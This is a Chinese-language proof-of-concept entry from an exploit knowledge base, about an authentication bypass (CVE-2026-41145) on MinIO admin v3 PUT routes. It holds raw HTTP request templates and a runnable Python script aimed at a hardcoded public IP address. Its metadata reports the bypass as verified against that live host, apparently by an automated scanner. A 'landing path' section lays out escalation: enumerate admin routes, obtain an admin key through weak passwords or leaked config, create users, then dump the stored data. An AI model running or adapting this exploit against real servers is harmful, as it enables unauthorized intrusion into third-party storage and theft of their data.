# MinIO admin v3 PUT 路由同样被 CVE-2026-41145 流式签名绕过穿透（无 Authorization 头也到达 handler）

- **code**: minio-admin-v3-streaming-unsigned-payload-trailer-bypass-cve
- **kind**: poc
- **category**: auth-bypass
- **cve**: CVE-2026-41145
- **component**: MinIO（admin v3 管理面，:9000）
- **severity**: low
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: 2026-11-03 由 work(i7573) 在 23.147.148.253:9000（Server: MinIO，部署模式 mode-server-xl-single，由响应体泄露）以 python + raw socket 直连、无代理实测。同一 PUT /minio/admin/v3/add-service-account 只改凭据部分，三种形态（真 AK+随机签名 / 不存在的 AK artxnosuchak / 完全删除 Authorization 头）回显逐字节一致，全部 403 {"Code":"AccessDenied","Resource":"/minio/admin/v3/add-service-account"}；对照：GET 同路径 403 SignatureDoesNotMatch、POST 同路径 426 XMinioAdminVersionMismatch；对象面校准：普通签名 PUT 新桶 SignatureDoesNotMatch，只改 streaming 头则 AccessDenied + <BucketName>。据此判定签名层与 AK 存在性校验均被跳过、请求已进入 admin handler。定 low 的原因：mode-server-xl-single 下绝大多数 admin 路由未注册（426），且 AccessDenied 表示过不了 IAM 权限闸，本实例尚未拿到桶清单/服务账号。原始回显留存于 D:/ARTEX/data/tasks/612/i7573/raw.log、resp.log，脚本 admin_probe.py / probe4.py。
- **path**: pocs/minio-admin-v3-streaming-unsigned-payload-trailer-bypass-cve/minio_admin_v3_streaming_bypass.md
- **tags**: minio,admin v3,admin api,sigv4,aws-chunked,streaming-unsigned-payload-trailer,cve-2026-41145,签名绕过,无需授权头,add-service-account,add-user
- **created_at**: 2026-11-02T17:14:12.615Z
- **engine**: http://23.147.148.253:9000/minio/admin/v3/
- **found_by**: vuln-scan

## 描述

CVE-2026-41145 的 STREAMING-UNSIGNED-PAYLOAD-TRAILER 分支不限于对象面：MinIO admin v3 的 PUT 路由同样整段跳过 SigV4 校验与 AK 存在性校验，把请求直接送进 admin handler。验证判据是"同一 PUT 请求只改 x-amz-content-sha256 一个头，回显从签名层的 SignatureDoesNotMatch 变成 handler 的 AccessDenied(Resource=admin 路径)"；把 Authorization 整段删掉仍回 AccessDenied，是决定性证据。注意 AccessDenied 来自 admin handler 的身份判定，不代表未授权可用——要真正落地还需该部署注册了目标 admin 路由、且存在具备 admin 权限的身份。与条目「minio-streaming-unsigned-payload-trailer-sigv4-bypass-cve-20」（对象面 PUT 建桶）同一根因，本条是其管理面延伸。

## 用法

```
适用：拿到 MinIO :9000 但没有任何 secret，想判断 admin 面能否被免签到达。

1) 先打基线三连，确认路径存在与分支差异（同一条路径、三种形态）：
   GET  /minio/admin/v3/add-service-account                -> 403 SignatureDoesNotMatch（签名层拦下，未进 handler）
   POST /minio/admin/v3/add-service-account  裸体           -> 426 XMinioAdminVersionMismatch（进了 handler，但版本/路由不符）
   PUT  /minio/admin/v3/add-service-account  普通签名(随机secret) -> 403 SignatureDoesNotMatch
2) 阳性判定（保持同一路径同一体，只改 x-amz-content-sha256 + 分帧）：
   PUT 同路径，头 = x-amz-content-sha256: STREAMING-UNSIGNED-PAYLOAD-TRAILER / x-amz-decoded-content-length / Content-Encoding: aws-chunked / Content-Length，体按 aws-chunked 分帧带 x-amz-checksum-crc32 trailer
   - 回 403 {"Code":"AccessDenied",...,"Resource":"/minio/admin/v3/add-service-account"} = 绕过成立（已过签名层，被 admin 身份闸拦）
   - 回 403 SignatureDoesNotMatch = 没走流式分支
3) 加固判定：Credential 换成不存在的 AK（artxnosuchak/…）→ 仍 AccessDenied（普通模式下未知 AK 是 InvalidAccessKeyId），证明 AK 存在性校验也被跳过。
4) 决定性判定：整段删除 Authorization 头，仍回同一 AccessDenied = 无需任何凭据即到达 handler。
5) 目标路由可用性：本部署为 mode-server-xl-single，多数 admin 路由未注册直接 426；只有已注册路由会给 AccessDenied。逐个试 /minio/admin/v3/{add-service-account,add-user?accessKey=,info,service-account,user}，把 426 与 AccessDenied 分开记。
6) 落地条件：AccessDenied 说明还缺能过 IAM 的身份。拿到任一 admin/root AK 后同一请求只把 Credential 换成真 AK（secret 仍可随机），签名照样不算，直接落到 add-service-account / add-user 的 handler 上；想通吃则改成 PUT /minio/admin/v3/... 免签下发用户或服务账号，再回到对象面拖库。

失败常见原因：用了 GET/HEAD（不走该分支）；体没分帧或漏 Content-Encoding: aws-chunked / x-amz-decoded-content-length / 校验 trailer；把 AccessDenied 误读成"未授权可用"（其实只是到了 handler）；在未注册路由上反复打（426 不是绕过失效）；目标是 S3 兼容网关而非 MinIO。
```

## 正文

```
# MinIO admin v3 PUT 路由被 CVE-2026-41145 绕过（无 Authorization 头也到达 handler）

## 结论

`STREAMING-UNSIGNED-PAYLOAD-TRAILER` 的免签分支**不只作用于对象面**：MinIO 管理面
`/minio/admin/v3/*` 的 **PUT** 路由同样整段跳过 SigV4 校验，连 Credential 里的 AK 是否存在都不校验——
把 `Authorization` 头整段删掉，请求仍被送进 admin handler。

判据是响应码的**归属**，不是"能不能读到数据"：

| 形态 | 回显 | 含义 |
|---|---|---|
| `GET` 同路径 | `403 SignatureDoesNotMatch` | 停在签名层，未进 handler |
| `POST` 同路径（裸体） | `426 XMinioAdminVersionMismatch` | 进了 handler，但该形态/版本不符 |
| `PUT` + 普通签名 + 随机 secret | `403 SignatureDoesNotMatch` | 阴性对照 |
| `PUT` + streaming 头 + 随机 secret | `403 {"Code":"AccessDenied","Resource":"/minio/admin/v3/..."}` | **绕过成立**，进 handler 后被身份闸拦 |
| 同上，Credential 换不存在 AK | 仍 `AccessDenied`（正常模式应为 `InvalidAccessKeyId`） | AK 存在性校验也被跳过 |
| 同上，**删除整个 Authorization 头** | 仍同一 `AccessDenied` | **决定性证据：无需任何凭据** |

`AccessDenied` 来自 admin handler 的身份判定，**不等于可未授权操作**。

## 前置条件

1. 目标是 MinIO 的 S3 端口（`Server: MinIO`）。
2. 版本 `< RELEASE.2026-04-11T03-20-12Z`。
3. 请求必须是**带体 PUT** + `Content-Encoding: aws-chunked` 分帧 + `x-amz-checksum-crc32` trailer
   （`Content-Length` 或 `Transfer-Encoding: chunked` 均可）；GET 不走该分支。
4. 目标上该 admin 路由已注册（`mode-server-xl-single` 等部署模式下多数路由未注册，直接 426）。

## 原始请求模板

基线（阴性）：

```http
PUT /minio/admin/v3/add-service-account HTTP/1.1
Host: <HOST>:9000
x-amz-date: <ts>
x-amz-content-sha256: <sha256(body)>
Authorization: AWS4-HMAC-SHA256 Credential=<AK>/<date>/us-east-1/s3/aws4_request, SignedHeaders=host;x-amz-content-sha256;x-amz-date, Signature=<随机 secret 算出的错误签名>
Content-Length: <len(body)>

{"policy":""}
```

阳性（流式，`Authorization` 可整段删掉）：

```http
PUT /minio/admin/v3/add-service-account HTTP/1.1
Host: <HOST>:9000
x-amz-date: <ts>
x-amz-content-sha256: STREAMING-UNSIGNED-PAYLOAD-TRAILER
x-amz-decoded-content-length: 13
Content-Encoding: aws-chunked
Content-Length: <len(framed)>

d\r\n{"policy":""}\r\n0\r\nx-amz-checksum-crc32:<base64(crc32(body))>\r\n\r\n
```

同类路由：`PUT /minio/admin/v3/add-user?accessKey=<name>`，体为 16 字节随机口令。

## 复现脚本（python3，直连）

```python
import http.client, hashlib, hmac, base64, zlib, datetime, random, time

HOST, PORT = '23.147.148.253', 9000
REGION, SERVICE = 'us-east-1', 's3'
ts = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
stamp = ts[:8]

def fake_auth(method, path, ak):
    sk = ''.join(random.choice('abcdef0123456789') for _ in range(32))
    h = {'host': f'{HOST}:{PORT}', 'x-amz-date': ts,
         'x-amz-content-sha256': 'STREAMING-UNSIGNED-PAYLOAD-TRAILER'}
    sh = ';'.join(sorted(h))
    ch = ''.join(f'{k}:{h[k]}\n' for k in sorted(h))
    cr = '\n'.join([method, path, '', ch, sh, 'STREAMING-UNSIGNED-PAYLOAD-TRAILER'])
    scope = f'{stamp}/{REGION}/{SERVICE}/aws4_request'
    sts = '\n'.join(['AWS4-HMAC-SHA256', ts, scope, hashlib.sha256(cr.encode()).hexdigest()])
    k = ('AWS4' + sk).encode()
    for m in (stamp, REGION, SERVICE, 'aws4_request'):
        k = hmac.new(k, m.encode(), hashlib.sha256).digest()
    return (f'AWS4-HMAC-SHA256 Credential={ak}/{scope}, SignedHeaders={sh}, '
            'Signature=' + hmac.new(k, sts.encode(), hashlib.sha256).hexdigest())

def chunked(body):
    crc = base64.b64encode(zlib.crc32(body).to_bytes(4, 'big')).decode()
    return (f'{len(body):x}\r\n'.encode() + body + b'\r\n0\r\n'
            + f'x-amz-checksum-crc32:{crc}\r\n'.encode() + b'\r\n')

def send(method, path, body, ak=None):
    framed = chunked(body)
    h = {'x-amz-date': ts,
         'x-amz-content-sha256': 'STREAMING-UNSIGNED-PAYLOAD-TRAILER',
         'x-amz-decoded-content-length': str(len(body)),
         'Content-Encoding': 'aws-chunked',
         'Content-Length': str(len(framed))}
    if ak:
        h['Authorization'] = fake_auth(method, path, ak)
    c = http.client.HTTPConnection(HOST, PORT, timeout=10)
    c.request(method, path, body=framed, headers=h)
    r = c.getresponse(); d = r.read(); c.close()
    print(method, path, 'ak=', ak, '->', r.status, d[:200])

P = '/minio/admin/v3/add-service-account'
send('PUT', P, b'{"policy":""}', 'artxnosuchak')   # 期望 403 AccessDenied
send('PUT', P, b'{"policy":""}')                   # 期望 403 AccessDenied（无 Authorization）
send('PUT', '/minio/admin/v3/add-user?accessKey=artxprobe',
     b'artxprobe123456', 'artxnosuchak')           # 期望 403 AccessDenied
```

`/minio/admin/v3/add-user?accessKey=` 无论带不带 Authorization 都回同一
`{"Code":"AccessDenied","Resource":"/minio/admin/v3/add-user"}` —— 即签名与 AK 存在性均未参与。

## 落地路径

绕过只把人送到 handler，身份闸仍在。要真正操作：

1. 先扫出**已注册**的 admin 路由（`AccessDenied` vs `426` 分开记），未注册的一律 426；
2. 拿到任意一个具备 admin 权限的 AK（9001 登录 oracle / 弱口令 / 泄露配置），同一请求只把
   Credential 换成真 AK、secret 仍可随机填，直接落到 `add-user` / `add-service-account`；
3. 免签下发新 AK 后回到对象面拖库（对象面同款绕过见
   `minio-streaming-unsigned-payload-trailer-sigv4-bypass-cve-20`）。

## 常见失败原因

- 使用 GET/HEAD —— 不走该分支，恒 `SignatureDoesNotMatch`；
- 体没做 aws-chunked 分帧，或漏 `Content-Encoding` / `x-amz-decoded-content-length` / crc32 trailer；
- 把 `AccessDenied` 误判成"未授权可用"：它只证明到了 handler；
- 在未注册路由上反复打，看到 426 就以为绕过失效；
- 目标是 S3 兼容网关（Ceph/OSS/s3proxy）而非 MinIO 本体，行为可能不同。

```
